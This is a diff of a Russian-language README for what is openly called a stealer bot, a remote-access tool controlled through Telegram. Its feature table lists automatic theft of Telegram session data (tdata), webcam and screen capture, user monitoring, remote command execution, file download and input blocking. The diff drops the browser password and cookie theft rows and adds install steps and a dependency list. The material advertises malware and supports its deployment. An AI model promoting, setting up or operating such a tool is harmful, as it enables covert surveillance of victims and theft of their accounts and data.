@@ -12,17 +12,15 @@
 
 ## Возможности
 
-| Функция | Описание |
+| Функции | Описание |
 |--------|--------|
-| **Пароли** | Chrome, Edge — все логины и пароли |
-| **Куки** | Сессии из браузеров |
 | **tdata** | Автокража сессий Telegram (AyuGram, Desktop) |
 | **Скриншоты** | `/screenshot` — мгновенно |
 | **Вебкамера** | `/webcam` — фото с камеры |
 | **Обои** | `/imagepc` + фото → смена фона |
 | **Мониторинг** | Что делает юзер: Chrome, CS2, Discord |
 | **Управление** | Блокировка мыши/клавиатуры, выключение, перезагрузка |
-| **Файлы** | `/listfiles`, `/downloadfile`, пагинация |
+| **Просмотр Файлов** | `/listfiles`, `/downloadfile`, пагинация |
 | **CMD** | `/executecmd` — выполнение команд |
 | **Звук** | `/sound`, `/setvolume`, `/offvolume` |
 | **Wi-Fi** | `/onwifi`, `/offwifi` |
@@ -47,9 +45,26 @@
 ## Установка
 
 ```bash
-# 1. Клонируем
-git clone https://github.com/yourname/stealer-bot.git
-cd stealer-bot
+# 1. Скачиваем
+.ZIP архив
 
 # 2. Устанавливаем зависимости
 pip install -r requirements.txt
+
+# 3. Запускаем
+python op.py
+```
+## requirements.txt
+```bash
+aiogram==2.25.1
+requests
+psutil
+pyautogui
+opencv-python
+pillow
+pycryptodome
+pywin32
+pycaw
+keyboard
+telethon
+python-pptx
